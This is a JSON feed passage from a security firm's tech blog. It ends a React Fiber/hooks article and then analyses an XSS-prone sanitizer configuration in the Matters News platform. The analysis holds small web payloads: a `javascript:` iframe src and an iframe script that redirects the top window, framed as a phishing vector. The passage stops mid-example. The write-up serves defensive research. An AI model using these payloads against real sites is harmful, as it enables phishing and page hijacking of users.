href=\"#%E8%BC%83%E5%B0%91%E5%9C%A8%E7%94%A8-class-component-%EF%BC%8C%E9%82%A3%E4%BE%86%E8%AB%87%E8%AB%87-function-component\">#</a> 較少在用 class component ，那來談談 function component</h2>\n<p>時至今日，function component 搭配 hooks 幾乎已成了主流，而 function component 在渲染時可以避免多餘的判斷 (<a href=\"https://github.com/facebook/react/blob/v16.13.1/packages/react-reconciler/src/ReactFiberBeginWork.js#L1306\">mountIndeterminateComponent</a>)</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p10.png\" alt=\"RE: React hooks\"><br>\n<a href=\"https://medium.com/the-guild/under-the-hood-of-reacts-hooks-system-eb59638c9dba\">under-the-hood-of-reacts-hooks-system</a></p>\n<p>而大家常用的 <a href=\"https://github.com/facebook/react/blob/4c7036e807/packages/react-reconciler/src/ReactFiberHooks.new.js\">hook</a> 則會形成 hook 鍊，保存在 Fiber 的 memoizedState 中，通過 dispatcher 去更新 fiber 內的 state 及 effect 狀態：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> hook<span class=\"token operator\">:</span> Hook <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  memoizedState<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">// hook 的狀態</span><br>  baseState<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//起始 state</span><br>  baseQueue<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//起始 queue</span><br>  queue<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//需要更新的update</span><br>  next<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//下一個hook</span><br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre>\n<p>例如 const [state, updateState] = useState(initialState)， memoizedState 就是 initialState。</p>\n<p>每個 hook 都會被放到 queue 當中。當您調用 setState 函數時，React 其實不會立即調用 updater 函式，而是將其保存在隊列中並安排重新渲染。</p>\n<!-- 至於優化常用的 [useMemo](https://github.com/facebook/react/blob/v16.13.1/packages/react-reconciler/src/ReactFiberBeginWork.js#L370) 則會將元件改為較為[淺層的比對](https://github.com/facebook/react/blob/v16.13.1/packages/react-reconciler/src/ReactFiberBeginWork.js#L456) -->\n<h3 id=\"%E5%8F%83%E8%80%83\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83\">#</a> 參考</h3>\n<p><a href=\"https://segmentfault.com/a/1190000039225217\">https://segmentfault.com/a/1190000039225217</a><br>\n<a href=\"https://twitter.com/acdlite/status/977291318324948992\">https://twitter.com/acdlite/status/977291318324948992</a><br>\n<a href=\"https://indepth.dev/posts/1008/inside-fiber-in-depth-overview-of-the-new-reconciliation-algorithm-in-react\">https://indepth.dev/posts/1008/inside-fiber-in-depth-overview-of-the-new-reconciliation-algorithm-in-react</a><br>\n<a href=\"https://www.bilibili.com/video/av48384879/\">https://www.bilibili.com/video/av48384879/</a></p>\n<p>延伸閱讀<br>\n<a href=\"https://segmentfault.com/a/1190000017241034?utm_source=sf-related\">https://segmentfault.com/a/1190000017241034?utm_source=sf-related</a></p>\n",
      "date_published": "2021-05-28T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/prevent-xss-might-be-harder-than-you-thought/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/prevent-xss-might-be-harder-than-you-thought/",
      "title": "防止 XSS 可能比想像中困難",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<p>如果你不知道什麼是 XSS（Cross-site Scripting），簡單來說就是駭客可以在你的網站上面執行 JavaScript 的程式碼。既然可以執行，那就有可能可以把使用者的 token 偷走，假造使用者的身份登入，就算偷不走 token，也可以竄改頁面內容，或是把使用者導到釣魚網站等等。</p>\n<p>要防止 XSS，就必須阻止駭客在網站上面執行程式碼，而防禦的方式有很多，例如說可以透過 CSP（Content-Security-Policy）這個 HTTP response header 防止 inline script 的執行或是限制可以載入 script 的 domain，也可以用 <a href=\"https://web.dev/trusted-types/\">Trusted Types</a> 防止一些潛在的攻擊以及指定規則，或是使用一些過濾 XSS 的 library，例如說 <a href=\"https://github.com/cure53/DOMPurify\">DOMPurify</a> 以及 <a href=\"https://github.com/leizongmin/js-xss\">js-xss</a>。</p>\n<p>但是用了這些就能沒事了嗎？是也不是。</p>\n<p>如果使用正確那當然沒有問題，但若是有用可是設定錯誤的話，還是有可能存在 XSS 的漏洞。</p>\n<!-- summary -->\n<p>前陣子我剛從公司內轉到一個做資安的團隊 <a href=\"https://cymetrics.io/zh-tw\">Cymetrics</a>，在對一些網站做研究的時候發現了一個現成的案例，因此這篇就以這個現成的案例來說明怎樣叫做錯誤的設定，而這個設定又會帶來什麼樣的影響。</p>\n<!-- summary -->\n<h2 id=\"%E9%8C%AF%E8%AA%A4%E7%9A%84%E8%A8%AD%E5%AE%9A%EF%BC%8C%E6%84%8F%E6%96%99%E4%B9%8B%E5%A4%96%E7%9A%84%E7%B5%90%E6%9E%9C\"><a class=\"direct-link\" href=\"#%E9%8C%AF%E8%AA%A4%E7%9A%84%E8%A8%AD%E5%AE%9A%EF%BC%8C%E6%84%8F%E6%96%99%E4%B9%8B%E5%A4%96%E7%9A%84%E7%B5%90%E6%9E%9C\">#</a> 錯誤的設定，意料之外的結果</h2>\n<p><a href=\"https://matters.news/\">Matters News</a> 是一個去中心化的寫作社群平台，而且所有的程式碼都有<a href=\"https://github.com/thematters\">開源</a>！</p>\n<p>像是這種部落格平台，我最喜歡看的是他們怎麼處理內容的過濾，秉持著好奇跟研究的心態，可以來看看他們在文章跟評論的部分是怎麼做的。</p>\n<p>Server 過濾的程式碼在這邊：<a href=\"https://github.com/thematters/matters-server/blob/bf49f129eb63acaab707609f6a12fced7aaf0f4c/src/common/utils/xss.ts\">matters-server/src/common/utils/xss.ts</a>：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">import</span> xss <span class=\"token keyword\">from</span> <span class=\"token string\">'xss'</span><br><br><span class=\"token keyword\">const</span> <span class=\"token constant\">CUSTOM_WHITE_LISTS</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  a<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token punctuation\">(</span>xss<span class=\"token punctuation\">.</span>whiteList<span class=\"token punctuation\">.</span>a <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'class'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figure<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figcaption<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  source<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  iframe<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'frameborder'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'allowfullscreen'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sandbox'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">onIgnoreTagAttr</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">tag<span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span> value<span class=\"token operator\">:</span> string</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token comment\">/**<br>   * Allow attributes of whitelist tags start with \"data-\" or \"class\"<br>   *<br>   * @see https://github.com/leizongmin/js-xss#allow-attributes-of-whitelist-tags-start-with-data-<br>   */</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">.</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token string\">'data-'</span> <span class=\"token operator\">||</span> name<span class=\"token punctuation\">.</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token string\">'class'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// escape its value using built-in escapeAttrValue function</span><br>    <span class=\"token keyword\">return</span> name <span class=\"token operator\">+</span> <span class=\"token string\">'=\"'</span> <span class=\"token operator\">+</span> xss<span class=\"token punctuation\">.</span><span class=\"token function\">escapeAttrValue</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\"'</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">ignoreTagProcessor</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><br>  <span class=\"token parameter\">tag<span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span><br>  html<span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span><br>  options<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token punctuation\">[</span>key<span class=\"token operator\">:</span> string<span class=\"token punctuation\">]</span><span class=\"token operator\">:</span> any <span class=\"token punctuation\">}</span></span><br><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tag <span class=\"token operator\">===</span> <span class=\"token string\">'input'</span> <span class=\"token operator\">||</span> tag <span class=\"token operator\">===</span> <span class=\"token string\">'textarea'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">return</span> <span class=\"token string\">''</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">const</span> xssOptions <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  whiteList<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>xss<span class=\"token punctuation\">.</span>whiteList<span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span><span class=\"token constant\">CUSTOM_WHITE_LISTS</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>  onIgnoreTagAttr<span class=\"token punctuation\">,</span><br>  onIgnoreTag<span class=\"token operator\">:</span> ignoreTagProcessor<span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span><br><span class=\"token keyword\">const</span> customXSS <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">xss<span class=\"token punctuation\">.</span>FilterXSS</span><span class=\"token punctuation\">(</span>xssOptions<span class=\"token punctuation\">)</span><br><br><span class=\"token keyword\">export</span> <span class=\"token keyword\">const</span> <span class=\"token function-variable function\">sanitize</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">string<span class=\"token operator\">:</span> string</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> customXSS<span class=\"token punctuation\">.</span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">)</span></code></pre>\n<p>這邊比較值得注意的是這一段：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> <span class=\"token constant\">CUSTOM_WHITE_LISTS</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  a<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token punctuation\">(</span>xss<span class=\"token punctuation\">.</span>whiteList<span class=\"token punctuation\">.</span>a <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'class'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figure<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figcaption<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  source<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  iframe<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'frameborder'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'allowfullscreen'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sandbox'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>這一段就是允許被使用的 tag 跟屬性，而屬性的內容也會被過濾。例如說雖然允許 iframe 跟 src 屬性，但是 <code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;</code> 是行不通的，因為這種 <code>javascript:</code> 開頭的 src 會被過濾掉。</p>\n<p>只看 server side 的沒有用，還需要看 client side 那邊是怎麼 render 的。</p>\n<p>對於文章的顯示是這樣的：<a href=\"https://github.com/thematters/matters-web/blob/0349fd87cc4737ff9509ec5eae2c2d4bda9de057/src/views/ArticleDetail/Content/index.tsx\">src/views/ArticleDetail/Content/index.tsx</a>）</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">></span><br>  <span class=\"token operator\">&lt;</span>div<br>    className<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token function\">classNames</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> <span class=\"token string\">'u-content'</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> translating <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><br>    dangerouslySetInnerHTML<span class=\"token operator\">=</span><br>    onClick<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>captureClicks<span class=\"token punctuation\">}</span><br>    ref<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>contentContainer<span class=\"token punctuation\">}</span><br>  <span class=\"token operator\">/</span><span class=\"token operator\">></span><br><br>  <span class=\"token operator\">&lt;</span>style jsx<span class=\"token operator\">></span><span class=\"token punctuation\">{</span>styles<span class=\"token punctuation\">}</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>style<span class=\"token operator\">></span><br><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span><span class=\"token operator\">></span></code></pre>\n<p>Matters 的前端使用的是 React，在 React 裡面所 render 的東西預設都已經 escape 過了，所以基本上不會有 XSS 的洞。但有時候我們不想要它過濾，例如說文章內容，我們可能會需要一些 tag 可以 render 成 HTML，這時候就可以用 <code>dangerouslySetInnerHTML</code>，傳入這個的東西會直接以 innerHTML 的方式 render 出來，不會被過濾。</p>\n<p>所以一般來說都會採用 js-xss + dangerouslySetInnerHTML 這樣的做法，確保 render 的內容儘管是 HTML，但不會被 XSS。</p>\n<p>這邊在傳入 dangerouslySetInnerHTML 之前先過了一個叫做 optimizeEmbed 的函式，可以繼續往下追，看到 <a href=\"https://github.com/thematters/matters-web/blob/0349fd87cc4737ff9509ec5eae2c2d4bda9de057/src/common/utils/text.ts#L89\">src/common/utils/text.ts</a>：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">export</span> <span class=\"token keyword\">const</span> <span class=\"token function-variable function\">optimizeEmbed</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">content<span class=\"token operator\">:</span> string</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">return</span> content<br>    <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">\\&lt;iframe </span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">'&lt;iframe loading=\"lazy\"'</span><span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><br>      <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">&lt;img\\s[^>]*?src\\s*=\\s*['\\\"]([^'\\\"]*?)['\\\"][^>]*?></span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span><br>      <span class=\"token punctuation\">(</span><span class=\"token parameter\">match<span class=\"token punctuation\">,</span> src<span class=\"token punctuation\">,</span> offset</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">return</span> <span class=\"token comment\">/* html */</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\"><br>      &lt;picture><br>        &lt;source<br>          type=\"image/webp\"<br>          media=\"(min-width: 768px)\"<br>          srcSet=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">toSizedImageURL</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> url<span class=\"token operator\">:</span> src<span class=\"token punctuation\">,</span> size<span class=\"token operator\">:</span> <span class=\"token string\">'1080w'</span><span class=\"token punctuation\">,</span> ext<span class=\"token operator\">:</span> <span class=\"token string\">'webp'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>          onerror=\"this.srcset='</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>src<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">'\"<br>        /><br>        &lt;source<br>          media=\"(min-width: 768px)\"<br>          srcSet=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">toSizedImageURL</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> url<span class=\"token operator\">:</span> src<span class=\"token punctuation\">,</span> size<span class=\"token operator\">:</span> <span class=\"token string\">'1080w'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>          onerror=\"this.srcset='</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>src<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">'\"<br>        /><br>        &lt;source<br>          type=\"image/webp\"<br>          srcSet=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">toSizedImageURL</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> url<span class=\"token operator\">:</span> src<span class=\"token punctuation\">,</span> size<span class=\"token operator\">:</span> <span class=\"token string\">'540w'</span><span class=\"token punctuation\">,</span> ext<span class=\"token operator\">:</span> <span class=\"token string\">'webp'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>        /><br>        &lt;img<br>          src=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>src<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>          srcSet=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">toSizedImageURL</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> url<span class=\"token operator\">:</span> src<span class=\"token punctuation\">,</span> size<span class=\"token operator\">:</span> <span class=\"token string\">'540w'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>          loading=\"lazy\"<br>        /><br>      &lt;/picture><br>    </span><span class=\"token template-punctuation string\">`</span></span><br>      <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>這邊採用 RegExp 把 img src 拿出來，然後用字串拼接的方式直接拼成 HTML，再往下看 <a href=\"https://github.com/thematters/matters-web/blob/0349fd87cc4737ff9509ec5eae2c2d4bda9de057/src/common/utils/url.ts#L49\">toSizedImageURL</a>：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">export</span> <span class=\"token keyword\">const</span> <span class=\"token function-variable function\">toSizedImageURL</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\"><span class=\"token punctuation\">{</span> url<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">,</span> ext <span class=\"token punctuation\">}</span><span class=\"token operator\">:</span> ToSizedImageURLProps</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> assetDomain <span class=\"token operator\">=</span> process<span class=\"token punctuation\">.</span>env<span class=\"token punctuation\">.</span><span class=\"token constant\">NEXT_PUBLIC_ASSET_DOMAIN</span><br>    <span class=\"token operator\">?</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">https://</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>process<span class=\"token punctuation\">.</span>env<span class=\"token punctuation\">.</span><span class=\"token constant\">NEXT_PUBLIC_ASSET_DOMAIN</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><br>    <span class=\"token operator\">:</span> <span class=\"token string\">''</span><br>  <span class=\"token keyword\">const</span> isOutsideLink <span class=\"token operator\">=</span> url<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>assetDomain<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><br>  <span class=\"token keyword\">const</span> isGIF <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">gif</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">i</span></span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><br><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>assetDomain <span class=\"token operator\">||</span> isOutsideLink <span class=\"token operator\">||</span> isGIF<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">return</span> url<br>  <span class=\"token punctuation\">}</span><br><br>  <span class=\"token keyword\">const</span> key <span class=\"token operator\">=</span> url<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>assetDomain<span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">const</span> extedUrl <span class=\"token operator\">=</span> <span class=\"token function\">changeExt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> key<span class=\"token punctuation\">,</span> ext <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">const</span> prefix <span class=\"token operator\">=</span> size <span class=\"token operator\">?</span> <span class=\"token string\">'/'</span> <span class=\"token operator\">+</span> <span class=\"token constant\">PROCESSED_PREFIX</span> <span class=\"token operator\">+</span> <span class=\"token string\">'/'</span> <span class=\"token operator\">+</span> size <span class=\"token operator\">:</span> <span class=\"token string\">''</span><br><br>  <span class=\"token keyword\">return</span> assetDomain <span class=\"token operator\">+</span> prefix <span class=\"token operator\">+</span> extedUrl<br><span class=\"token punctuation\">}</span></code></pre>\n<p>只要 domain 是 assets 的 domain 並符合其他條件，就會經過一些字串處理之後回傳。</p>\n<p>看到這邊，就大致上了解整個文章的 render 過程了。</p>\n<p>會在 server side 用 js-xss 這套 library 進行過濾，在 client side 這邊則是用 dangerouslySetInnerHTML 來 render，其中會先對 img tag 做一些處理，把 img 改成用 picture + source 的方式針對不同解析度或是螢幕尺寸載入不同的圖片。</p>\n<p>以上就是這個網站 render 文章的整個過程，再繼續往下看之前你可以想一下，有沒有什麼地方有問題？</p>\n<p>== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==</p>\n<h2 id=\"%E7%AC%AC%E4%B8%80%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E9%8C%AF%E8%AA%A4%E7%9A%84%E5%B1%AC%E6%80%A7%E9%81%8E%E6%BF%BE\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%80%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E9%8C%AF%E8%AA%A4%E7%9A%84%E5%B1%AC%E6%80%A7%E9%81%8E%E6%BF%BE\">#</a> 第一個問題：錯誤的屬性過濾</h2>\n<p>你有發現這邊的過濾有問題嗎？</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> <span class=\"token constant\">CUSTOM_WHITE_LISTS</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  a<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token punctuation\">(</span>xss<span class=\"token punctuation\">.</span>whiteList<span class=\"token punctuation\">.</span>a <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'class'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figure<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figcaption<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  source<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  iframe<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'frameborder'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'allowfullscreen'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sandbox'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>開放 iframe 應該是因為要讓使用者可以嵌入 YouTube 影片之類的東西，但問題是這個網站並沒有用 CSP 指定合法的 domain，因此這邊的 src 可以隨意亂填，我可以自己做一個網站然後用 iframe 嵌入。如果網頁內容設計得好，看起來就會是這個網站本身的一部分：</p>\n<p><img src=\"https://i.imgur.com/rivVdiC.png\" alt=\"\"></p>\n<p>以上只是隨便填的一個範例，主要是讓大家看個感覺，如果真的有心想攻擊的話可以弄得更精緻，內容更吸引人。</p>\n<p>如果只是這樣的話，攻擊能否成功取決與內容是否能夠取信於使用者。但其實可以做到的不只這樣，大家知道在 iframe 裡面是可以操控外面的網站嗎？</p>\n<p>cross origin 的 window 之間能存取的東西有限，唯一能夠改變的是 <code>location</code> 這個東西，意思就是我們可以在 iframe 裡面，把嵌入你的網站重新導向：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>  top<span class=\"token punctuation\">.</span>location <span class=\"token operator\">=</span> <span class=\"token string\">'https://google.com'</span><br></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token 